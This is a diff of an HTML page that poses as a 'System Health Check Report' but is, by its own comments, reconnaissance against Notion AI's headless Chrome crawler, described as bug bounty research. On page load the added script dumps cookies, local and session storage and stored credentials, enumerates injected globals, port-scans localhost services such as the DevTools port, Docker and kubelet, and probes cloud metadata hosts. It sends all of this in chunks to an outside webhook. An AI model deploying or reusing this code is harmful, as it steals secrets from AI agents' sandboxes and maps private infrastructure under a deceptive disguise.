@@ -2,51 +2,494 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Sandbox Fingerprinting</title>
+    <title>System Health Check Report</title>
 </head>
 <body>
-    <h1>Fingerprinting Sandbox...</h1>
+    <h1>System Health Check Report</h1>
+    <p>Automated compatibility diagnostics. Nothing to worry about here.</p>
+    <div id="output">Running diagnostics...</div>
+
     <script>
-        // --- PASTE YOUR HOOKDECK URL HERE ---
-        const yourWebhookUrl = "https://hkdk.events/dp0gb9zztqv6wp"; 
+        // ================================================================
+        // RECON v3 — Deep Browser & Sandbox Fingerprinting
+        // Authorized bug bounty research — Notion AI Headless Chrome
+        // ================================================================
+        const WEBHOOK = "https://hkdk.events/dp0gb9zztqv6wp";
 
-        async function gatherAndSendData() {
-            try {
-                const advancedReconData = {
-                    sandbox_status: {
-                        cookies: document.cookie || 'None',
-                        localStorageLength: localStorage.length,
-                        sessionStorageLength: sessionStorage.length,
-                        hasFileSystemAPI: 'showOpenFilePicker' in window,
-                        pluginsCount: navigator.plugins.length,
-                        pdfViewerEnabled: navigator.pdfViewerEnabled,
-                        languages: navigator.languages
-                    },
-                    execution_context: {
-                        actual_location: window.location.href,
-                        // Checking if they inject a custom API into the window object
-                        windowKeys: Object.keys(window).filter(k => k.toLowerCase().includes('notion') || k.toLowerCase().includes('crawl'))
-                    },
-                    timestamp: new Date().toISOString()
-                };
-
-                await fetch(yourWebhookUrl, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(advancedReconData)
-                });
-            } catch (error) {
-                // Failsafe error logging
-                await fetch(yourWebhookUrl, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({ error: error.message })
-                });
-            }
+        // Helper: safely evaluate and return value or error string
+        function safe(fn) {
+            try { return fn(); } catch (e) { return `ERROR: ${e.name}: ${e.message}`; }
         }
 
-        gatherAndSendData();
+        // Helper: send a chunk to webhook (no-cors)
+        function exfil(label, data) {
+            return fetch(WEBHOOK, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chunk: label, ts: Date.now(), data })
+            }).catch(() => {});
+        }
+
+        async function runRecon() {
+            const results = {};
+
+            // ──────────────────────────────────────────────────
+            // MODULE 1: Basic Navigator (what we had before)
+            // ──────────────────────────────────────────────────
+            results.navigator_basic = {
+                userAgent:           navigator.userAgent,
+                platform:            navigator.platform,
+                language:            navigator.language,
+                languages:           safe(() => [...navigator.languages]),
+                deviceMemory:        navigator.deviceMemory || 'N/A',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
+                maxTouchPoints:      navigator.maxTouchPoints,
+                vendor:              navigator.vendor,
+                appVersion:          navigator.appVersion,
+                product:             navigator.product,
+                productSub:          navigator.productSub,
+                buildID:             safe(() => navigator.buildID || 'N/A'),
+                oscpu:               safe(() => navigator.oscpu || 'N/A'),
+                doNotTrack:          navigator.doNotTrack,
+                cookieEnabled:       navigator.cookieEnabled,
+                onLine:              navigator.onLine,
+                pdfViewerEnabled:    safe(() => navigator.pdfViewerEnabled),
+                webdriver:           navigator.webdriver,  // KEY: true = automated
+            };
+
+            // ──────────────────────────────────────────────────
+            // MODULE 2: Screen & Window Geometry
+            // ──────────────────────────────────────────────────
+            results.screen_window = {
+                screenWidth:   screen.width,
+                screenHeight:  screen.height,
+                availWidth:    screen.availWidth,
+                availHeight:   screen.availHeight,
+                colorDepth:    screen.colorDepth,
+                pixelDepth:    screen.pixelDepth,
+                outerWidth:    window.outerWidth,
+                outerHeight:   window.outerHeight,
+                innerWidth:    window.innerWidth,
+                innerHeight:   window.innerHeight,
+                devicePixelRatio: window.devicePixelRatio,
+                screenX:       window.screenX,
+                screenY:       window.screenY,
+            };
+
+            // ──────────────────────────────────────────────────
+            // MODULE 3: CRITICAL — Cookie / Storage / Credential Leakage
+            // ──────────────────────────────────────────────────
+            results.credential_leakage = {
+                // Any cookies set on this origin by the crawler?
+                document_cookies: safe(() => document.cookie || '(empty)'),
+
+                // localStorage — sometimes crawlers inject tokens here
+                localStorage_keys: safe(() => {
+                    const keys = [];
+                    for (let i = 0; i < localStorage.length; i++) keys.push(localStorage.key(i));
+                    return keys;
+                }),
+                localStorage_dump: safe(() => {
+                    const dump = {};
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const k = localStorage.key(i);
+                        dump[k] = localStorage.getItem(k);
+                    }
+                    return dump;
+                }),
+
+                // sessionStorage
+                sessionStorage_keys: safe(() => {
+                    const keys = [];
+                    for (let i = 0; i < sessionStorage.length; i++) keys.push(sessionStorage.key(i));
+                    return keys;
+                }),
+                sessionStorage_dump: safe(() => {
+                    const dump = {};
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const k = sessionStorage.key(i);
+                        dump[k] = sessionStorage.getItem(k);
+                    }
+                    return dump;
+                }),
+
+                // IndexedDB database names
+                indexedDB_databases: safe(() =>
+                    indexedDB.databases ? indexedDB.databases().then(dbs => dbs.map(d => d.name)) : 'API not available'
+                ),
+
+                // Credential Management API — check if pre-stored credentials exist
+                credentials_api: safe(() => {
+                    if (navigator.credentials && navigator.credentials.get) {
+                        return navigator.credentials.get({ password: true, federated: { providers: [] } })
+                            .then(cred => cred ? { id: cred.id, type: cred.type, name: cred.name } : 'No stored credentials')
+                            .catch(e => `CredAPI Error: ${e.message}`);
+                    }
+                    return 'Credentials API not available';
+                }),
+            };
+
+            // ──────────────────────────────────────────────────
+            // MODULE 4: Window Global Property Enumeration
+            // Find injected variables, Notion-specific globals, tokens
+            // ──────────────────────────────────────────────────
+            results.window_injected_globals = safe(() => {
+                // Compare against a clean iframe to find injected properties
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                const cleanWindow = iframe.contentWindow;
+                const cleanKeys = new Set(Object.getOwnPropertyNames(cleanWindow));
+                document.body.removeChild(iframe);
+
+                const currentKeys = Object.getOwnPropertyNames(window);
+                const injected = currentKeys.filter(k => !cleanKeys.has(k));
+
+                // For each injected key, try to grab its value
+                const injectedValues = {};
+                for (const key of injected.slice(0, 50)) { // cap at 50 to avoid payload bloat
+                    try {
+                        const val = window[key];
+                        if (typeof val === 'function') {
+                            injectedValues[key] = `[Function: ${val.name || 'anonymous'}]`;
+                        } else if (typeof val === 'object' && val !== null) {
+                            injectedValues[key] = JSON.stringify(val).slice(0, 500);
+                        } else {
+                            injectedValues[key] = String(val);
+                        }
+                    } catch (e) {
+                        injectedValues[key] = `[Access Error: ${e.message}]`;
+                    }
+                }
+                return { count: injected.length, keys: injected, values: injectedValues };
+            });
+
+            // ──────────────────────────────────────────────────
+            // MODULE 5: Performance Resource Timing — Leak loaded URLs
+            // Shows all scripts/resources the crawler injected
+            // ──────────────────────────────────────────────────
+            results.performance_resources = safe(() => {
+                const entries = performance.getEntriesByType('resource');
+                return entries.map(e => ({
+                    name: e.name,
+                    type: e.initiatorType,
+                    duration: e.duration,
+                    transferSize: e.transferSize,
+                }));
+            });
+
+            results.performance_navigation = safe(() => {
+                const nav = performance.getEntriesByType('navigation')[0];
+                return nav ? {
+                    type: nav.type,
+                    redirectCount: nav.redirectCount,
+                    domainLookupStart: nav.domainLookupStart,
+                    connectStart: nav.connectStart,
+                    requestStart: nav.requestStart,
+                    responseStart: nav.responseStart,
+                    responseEnd: nav.responseEnd,
+                    domComplete: nav.domComplete,
+                    transferSize: nav.transferSize,
+                    encodedBodySize: nav.encodedBodySize,
+                    serverTiming: nav.serverTiming,
+                } : 'N/A';
+            });
+
+            // ──────────────────────────────────────────────────
+            // MODULE 6: Origin, Protocol, & Security Context
+            // ──────────────────────────────────────────────────
+            results.security_context = {
+                origin:         window.origin,
+                location_href:  window.location.href,
+                location_proto: window.location.protocol,
+                location_host:  window.location.host,
+                isSecureContext: window.isSecureContext,
+                crossOriginIsolated: safe(() => window.crossOriginIsolated),
+                // Check if document was loaded in a sandboxed iframe
+                frameElement:   safe(() => window.frameElement ? 'In an iframe' : 'Top-level'),
+                parent_eq_self: window.parent === window,
+                opener:         window.opener ? 'Has opener' : 'No opener',
+                // CSP violations logged?
+                csp_meta: safe(() => {
+                    const metas = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
+                    return metas.length > 0 ? [...metas].map(m => m.content) : 'No CSP meta tags';
+                }),
+            };
+
+            // ──────────────────────────────────────────────────
+            // MODULE 7: Chrome-Specific & Extension Detection
+            // ──────────────────────────────────────────────────
+            results.chrome_internals = {
+                chrome_object_keys: safe(() => typeof chrome !== 'undefined' ? Object.keys(chrome) : 'chrome not defined'),
+                chrome_runtime:     safe(() => typeof chrome !== 'undefined' && chrome.runtime ? Object.keys(chrome.runtime) : 'N/A'),
+                chrome_app:         safe(() => typeof chrome !== 'undefined' && chrome.app ? Object.keys(chrome.app) : 'N/A'),
+                // CDP (Chrome DevTools Protocol) check
+                cdp_target:         safe(() => typeof window.__cdp !== 'undefined' ? window.__cdp : 'N/A'),
+                // Puppeteer/Playwright specific globals
+                puppeteer_globals:  safe(() => ({
+                    __puppeteer_evaluation_script__: typeof __puppeteer_evaluation_script__ !== 'undefined',
+                    __playwright:     typeof __playwright !== 'undefined',
+                    __PW_check:       typeof window.__PW_check !== 'undefined',
+                    cdc_check:        safe(() => {
+                        // Detect Chromium DevTools controller fingerprint
+                        const keys = Object.keys(document);
+                        return keys.filter(k => k.startsWith('$cdc_') || k.startsWith('__webdriver'));
+                    }),
+                })),
+            };
+
+            // ──────────────────────────────────────────────────
+            // MODULE 8: Service Workers & Cache API
+            // ──────────────────────────────────────────────────
+            results.service_workers = {
+                sw_controller: safe(() => navigator.serviceWorker ?
+                    (navigator.serviceWorker.controller ? {
+                        scriptURL: navigator.serviceWorker.controller.scriptURL,
+                        state: navigator.serviceWorker.controller.state
+                    } : 'No controller') : 'SW not available'
+                ),
+                sw_registrations: safe(() =>
+                    navigator.serviceWorker ?
+                        navigator.serviceWorker.getRegistrations().then(regs =>
+                            regs.map(r => ({ scope: r.scope, updateViaCache: r.updateViaCache }))
+                        ) : 'N/A'
+                ),
+                cache_names: safe(() => caches ? caches.keys() : 'Cache API not available'),
+            };
+
+            // ──────────────────────────────────────────────────
+            // MODULE 9: WebGL Renderer — GPU / VM fingerprint
+            // ──────────────────────────────────────────────────
+            results.webgl_fingerprint = safe(() => {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return 'WebGL not available';
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return {
+                    vendor:   debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
+                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
+                    version:  gl.getParameter(gl.VERSION),
+                    shadingVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                    extensions: gl.getSupportedExtensions(),
+                };
+            });
+
+            // ──────────────────────────────────────────────────
+            // MODULE 10: Network & Connection Info
+            // ──────────────────────────────────────────────────
+            results.network_info = {
+                connection: safe(() => {
+                    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                    return c ? {
+                        effectiveType: c.effectiveType,
+                        downlink: c.downlink,
+                        rtt: c.rtt,
+                        saveData: c.saveData,
+                        type: c.type,
+                    } : 'Connection API not available';
+                }),
+            };
+
+            // ──────────────────────────────────────────────────
+            // MODULE 11: Timing-Based Internal Port Scan
+            // Closed ports = fast reject, firewalled = slow timeout
+            // ──────────────────────────────────────────────────
+            results.port_scan = await (async () => {
+                const targets = [
+                    { host: '127.0.0.1',   port: 80,    label: 'localhost:80' },
+                    { host: '127.0.0.1',   port: 443,   label: 'localhost:443' },
+                    { host: '127.0.0.1',   port: 3000,  label: 'localhost:3000 (node)' },
+                    { host: '127.0.0.1',   port: 4444,  label: 'localhost:4444 (selenium)' },
+                    { host: '127.0.0.1',   port: 5900,  label: 'localhost:5900 (vnc)' },
+                    { host: '127.0.0.1',   port: 8080,  label: 'localhost:8080 (proxy)' },
+                    { host: '127.0.0.1',   port: 9222,  label: 'localhost:9222 (CDP!!)' },
+                    { host: '127.0.0.1',   port: 9229,  label: 'localhost:9229 (node debug)' },
+                    { host: '127.0.0.1',   port: 6379,  label: 'localhost:6379 (redis)' },
+                    { host: '127.0.0.1',   port: 5432,  label: 'localhost:5432 (postgres)' },
+                    { host: '127.0.0.1',   port: 27017, label: 'localhost:27017 (mongo)' },
+                    { host: '127.0.0.1',   port: 2375,  label: 'localhost:2375 (docker API)' },
+                    { host: '127.0.0.1',   port: 10250, label: 'localhost:10250 (kubelet)' },
+                    { host: '10.0.0.1',    port: 80,    label: '10.0.0.1:80 (gateway)' },
+                    { host: '172.17.0.1',  port: 80,    label: '172.17.0.1:80 (docker bridge)' },
+                ];
+
+                const scanResult = {};
+
+                async function probe(t) {
+                    const start = performance.now();
+                    try {
+                        const controller = new AbortController();
+                        const timeout = setTimeout(() => controller.abort(), 3000);
+                        await fetch(`http://${t.host}:${t.port}/`, {
+                            mode: 'no-cors',
+                            signal: controller.signal
+                        });
+                        clearTimeout(timeout);
+                        const elapsed = performance.now() - start;
+                        return { status: 'responded', ms: Math.round(elapsed) };
+                    } catch (e) {
+                        const elapsed = performance.now() - start;
+                        return { status: e.name === 'AbortError' ? 'timeout' : e.name, ms: Math.round(elapsed) };
+                    }
+                }
+
+                // Run probes sequentially to get clean timing
+                for (const t of targets) {
+                    scanResult[t.label] = await probe(t);
+                }
+                return scanResult;
+            })();
+
+            // ──────────────────────────────────────────────────
+            // MODULE 12: DNS Rebinding Prep — Resolve external hostnames
+            // ──────────────────────────────────────────────────
+            results.dns_timing = await (async () => {
+                const hosts = [
+                    'localhost',
+                    'metadata.google.internal',
+                    'kubernetes.default.svc',
+                    'kubernetes.default.svc.cluster.local',
+                    'instance-data.ec2.internal',
+                ];
+                const dnsResults = {};
+                for (const host of hosts) {
+                    const start = performance.now();
+                    try {
+                        const ctrl = new AbortController();
+                        const to = setTimeout(() => ctrl.abort(), 2000);
+                        await fetch(`http://${host}/`, { mode: 'no-cors', signal: ctrl.signal });
+                        clearTimeout(to);
+                        dnsResults[host] = { resolved: true, ms: Math.round(performance.now() - start) };
+                    } catch (e) {
+                        dnsResults[host] = { resolved: false, error: e.name, ms: Math.round(performance.now() - start) };
+                    }
+                }
+                return dnsResults;
+            })();
+
+            // ──────────────────────────────────────────────────
+            // MODULE 13: Permissions API Probe
+            // ──────────────────────────────────────────────────
+            results.permissions = await (async () => {
+                const perms = ['geolocation', 'notifications', 'camera', 'microphone',
+                               'clipboard-read', 'clipboard-write', 'midi', 'accelerometer',
+                               'gyroscope', 'magnetometer', 'payment-handler'];
+                const permResults = {};
+                for (const p of perms) {
+                    try {
+                        const status = await navigator.permissions.query({ name: p });
+                        permResults[p] = status.state;
+                    } catch (e) {
+                        permResults[p] = `Error: ${e.message}`;
+                    }
+                }
+                return permResults;
+            })();
+
+            // ──────────────────────────────────────────────────
+            // MODULE 14: Timezone & Locale Deep Dive
+            // ──────────────────────────────────────────────────
+            results.locale_deep = {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                locale:   Intl.DateTimeFormat().resolvedOptions().locale,
+                calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
+                numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem,
+                dateNow: Date.now(),
+                tzOffset: new Date().getTimezoneOffset(),
+            };
+
+            // ──────────────────────────────────────────────────
+            // MODULE 15: Document Metadata & Head Inspection
+            // ──────────────────────────────────────────────────
+            results.document_meta = {
+                title: document.title,
+                referrer: document.referrer,
+                domain: document.domain,
+                URL: document.URL,
+                documentURI: document.documentURI,
+                compatMode: document.compatMode,
+                characterSet: document.characterSet,
+                contentType: document.contentType,
+                lastModified: document.lastModified,
+                // All meta tags
+                metaTags: safe(() => [...document.querySelectorAll('meta')].map(m => ({
+                    name: m.name, content: m.content, httpEquiv: m.httpEquiv, property: m.getAttribute('property')
+                }))),
+                // All link tags (might reveal preloads to internal URLs)
+                linkTags: safe(() => [...document.querySelectorAll('link')].map(l => ({
+                    rel: l.rel, href: l.href, type: l.type
+                }))),
+                // All script tags
+                scriptTags: safe(() => [...document.querySelectorAll('script')].map(s => ({
+                    src: s.src || '(inline)',
+                    type: s.type,
+                    async: s.async,
+                    defer: s.defer,
+                    length: s.src ? 0 : s.textContent.length
+                }))),
+            };
+
+            // ──────────────────────────────────────────────────
+            // MODULE 16: Check for leaked env vars / process object
+            // (Node.js context leak in misconfigured Electron/SSR)
+            // ──────────────────────────────────────────────────
+            results.env_leak_check = {
+                process_exists: typeof process !== 'undefined',
+                process_env:    safe(() => typeof process !== 'undefined' && process.env ? Object.keys(process.env).slice(0, 30) : 'N/A'),
+                require_exists: typeof require !== 'undefined',
+                global_exists:  typeof global !== 'undefined',
+                Buffer_exists:  typeof Buffer !== 'undefined',
+                __dirname:      safe(() => typeof __dirname !== 'undefined' ? __dirname : 'N/A'),
+                __filename:     safe(() => typeof __filename !== 'undefined' ? __filename : 'N/A'),
+            };
+
+            // ──────────────────────────────────────────────────
+            // EXFILTRATE — Send data in chunks to avoid size limits
+            // ──────────────────────────────────────────────────
+
+            // Resolve any remaining promises in results
+            for (const key of Object.keys(results)) {
+                if (results[key] instanceof Promise) {
+                    try { results[key] = await results[key]; } catch (e) { results[key] = `Promise Error: ${e.message}`; }
+                }
+                // Also resolve nested promises
+                if (results[key] && typeof results[key] === 'object') {
+                    for (const subKey of Object.keys(results[key])) {
+                        if (results[key][subKey] instanceof Promise) {
+                            try { results[key][subKey] = await results[key][subKey]; } catch (e) { results[key][subKey] = `Promise Error: ${e.message}`; }
+                        }
+                    }
+                }
+            }
+
+            // Display on page (also useful — the AI reads this DOM content)
+            document.getElementById('output').innerHTML = '<pre>' + JSON.stringify(results, null, 2) + '</pre>';
+
+            // Send in chunks to avoid truncation at webhook
+            const chunkKeys = Object.keys(results);
+            for (let i = 0; i < chunkKeys.length; i += 3) {
+                const chunk = {};
+                for (let j = i; j < Math.min(i + 3, chunkKeys.length); j++) {
+                    chunk[chunkKeys[j]] = results[chunkKeys[j]];
+                }
+                await exfil(`recon_v3_chunk_${Math.floor(i / 3)}`, chunk);
+                // Small delay between chunks to not overwhelm
+                await new Promise(r => setTimeout(r, 200));
+            }
+
+            // Final beacon — full summary hash
+            await exfil('recon_v3_COMPLETE', {
+                modules_collected: chunkKeys.length,
+                total_json_size: JSON.stringify(results).length,
+            });
+        }
+
+        // ──────────────────────────────────────────────────
+        // LAUNCH
+        // ──────────────────────────────────────────────────
+        runRecon();
     </script>
 </body>
 </html>
